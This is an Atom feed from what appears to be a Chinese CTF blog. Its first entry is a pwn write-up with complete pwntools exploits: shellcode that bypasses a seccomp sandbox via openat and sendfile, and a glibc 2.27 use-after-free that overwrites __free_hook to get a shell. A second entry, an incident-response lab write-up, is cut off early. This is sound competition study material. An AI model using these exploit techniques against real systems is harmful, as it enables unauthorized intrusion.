<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LonTan0&#39;s Blog</title>
  
  
  <link href="https://lontan0.github.io/atom.xml" rel="self"/>
  
  <link href="https://lontan0.github.io/"/>
  <updated>2025-07-13T14:22:23.519Z</updated>
  <id>https://lontan0.github.io/</id>
  
  <author>
    <name>LonTan0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025第九届御网杯半决赛pwn部分题解</title>
    <link href="https://lontan0.github.io/2025/07/13/2025%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>https://lontan0.github.io/2025/07/13/2025%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2025-07-13T14:19:29.000Z</published>
    <updated>2025-07-13T14:22:23.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="no-wirte-no-read"><a href="#no-wirte-no-read" class="headerlink" title="no wirte,no read"></a>no wirte,no read</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xDEAD0000L</span>L, <span class="number">0x1000u</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEAD0000L</span>L, <span class="number">0x1000u</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xDEAD0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输入shellcode，然后调用。查一下沙盒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>直接用openat+sendfile了，这题刚开始远程没有给pwn文件运行权限，后来也是公告刚发恰好看到，拿了个一血</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.20.213&#x27;</span>,<span class="number">46069</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    p = process(file_name)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sd = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">s(sd)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="Simplest-pwn"><a href="#Simplest-pwn" class="headerlink" title="Simplest_pwn"></a>Simplest_pwn</h2><p>2.27的堆，明显的uaf，不能申请大堆块，先申请8个0x78，先拿libc，然后在tcachebins上申请出来free_hook，然后填入system，最后free一个binsh就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> input; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please tell me which chunk you want to delete:&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  input = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input &lt; <span class="number">0x10</span> &amp;&amp; *((_QWORD *)&amp;chunk_array + input) &amp;&amp; size_array[input] )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;chunk_array + input));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/root/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.20.213&#x27;</span>,<span class="number">46700</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,c</span>):</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27; want:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    rl(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    s(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,c</span>):</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    rl(<span class="string">b&#x27;content:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    s(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;delete:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;look:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">libc_base = get_libc64() - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system,binsh=get_sb()</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,p64(system))</span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="比赛题目附件链接"><a href="#比赛题目附件链接" class="headerlink" title="比赛题目附件链接"></a>比赛题目附件链接</h2><p>通过网盘分享的文件：2025御网杯线下赛<br>链接: <a href="https://pan.baidu.com/s/1NXhva6lt7S1yQgV03ZveOA?pwd=yhpd">https://pan.baidu.com/s/1NXhva6lt7S1yQgV03ZveOA?pwd=yhpd</a> 提取码: yhpd<br>–来自百度网盘超级会员v1的分享</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;no-wirte-no-read&quot;&gt;&lt;a href=&quot;#no-wirte-no-read&quot; class=&quot;headerlink&quot; title=&quot;no wirte,no read&quot;&gt;&lt;/a&gt;no wirte,no read&lt;/h2&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="wp" scheme="https://lontan0.github.io/categories/wp/"/>
    
    
    <category term="pwn" scheme="https://lontan0.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://lontan0.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>玄机-应急响应-vulntarget-b-01</title>
    <link href="https://lontan0.github.io/2025/07/07/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-b-01/"/>
    <id>https://lontan0.github.io/2025/07/07/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-b-01/</id>
    <published>2025-07-07T10:43:35.000Z</published>
    <updated>2025-07-07T10:45:38.816Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>1、黑客是从哪个端口作为入口点的<br>2、黑客使用了什么工具探测了ssh服务<br>3、黑客使用了什么工具扫描了目录（格式flag{工具&#x2F;版本号}）<br>4、黑客成功登录后台的IP地址？<br>5、黑客上传的木马连接密钥是什么？<br>6、黑客留下的后门文件的路径为？</p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>先看监听中的端口，然后在root目录下的install.sh中使用宝塔作为控制面板，然后可以看到默认开启端口，并且ngnix服务监听在两个端口上，可以发现81并不是默认开启的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-10-7 ~]# ss -lntup</span><br><span class="line">Netid  State      Recv-Q Send-Q            Local Address:Port                           Peer Address:Port</span><br><span class="line">udp    UNCONN     0      0                             *:68                                        *:*                   <span class="built_in">users</span>:((&quot;dhclient&quot;,pid=<span class="number">1046</span>,fd=<span class="number">6</span>))</span><br><span class="line">udp    UNCONN     0      0                     127.0.0.1:323                                       *:*                   <span class="built_in">users</span>:((&quot;chronyd&quot;,pid=<span class="number">645</span>,fd=<span class="number">5</span>))</span><br><span class="line">udp    UNCONN     0      0                         [::1]:323                                    [::]:*                   <span class="built_in">users</span>:((&quot;chronyd&quot;,pid=<span class="number">645</span>,fd=<span class="number">6</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:80                                        *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">10</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">10</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:81                                        *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">11</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">11</span>))</span><br><span class="line">tcp    LISTEN     0      9                             *:21                                        *:*                   <span class="built_in">users</span>:((&quot;pure-ftpd&quot;,pid=<span class="number">1729</span>,fd=<span class="number">4</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:8888                                      *:*                   <span class="built_in">users</span>:((&quot;BT-Panel&quot;,pid=<span class="number">2431</span>,fd=<span class="number">5</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:888                                       *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">9</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">9</span>))</span><br><span class="line">tcp    LISTEN     0      100                   127.0.0.1:25                                        *:*                   <span class="built_in">users</span>:((&quot;master&quot;,pid=<span class="number">1448</span>,fd=<span class="number">13</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:222                                       *:*                   <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1495</span>,fd=<span class="number">3</span>))</span><br><span class="line">tcp    LISTEN     0      128                        [::]:3306                                   [::]:*                   <span class="built_in">users</span>:((&quot;mysqld&quot;,pid=<span class="number">2374</span>,fd=<span class="number">13</span>))</span><br><span class="line">tcp    LISTEN     0      9                          [::]:21                                     [::]:*                   <span class="built_in">users</span>:((&quot;pure-ftpd&quot;,pid=<span class="number">1729</span>,fd=<span class="number">5</span>))</span><br><span class="line">tcp    LISTEN     0      100                       [::1]:25                                     [::]:*                   <span class="built_in">users</span>:((&quot;master&quot;,pid=<span class="number">1448</span>,fd=<span class="number">14</span>))</span><br><span class="line">tcp    LISTEN     0      128                        [::]:222                                    [::]:*                   <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1495</span>,fd=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 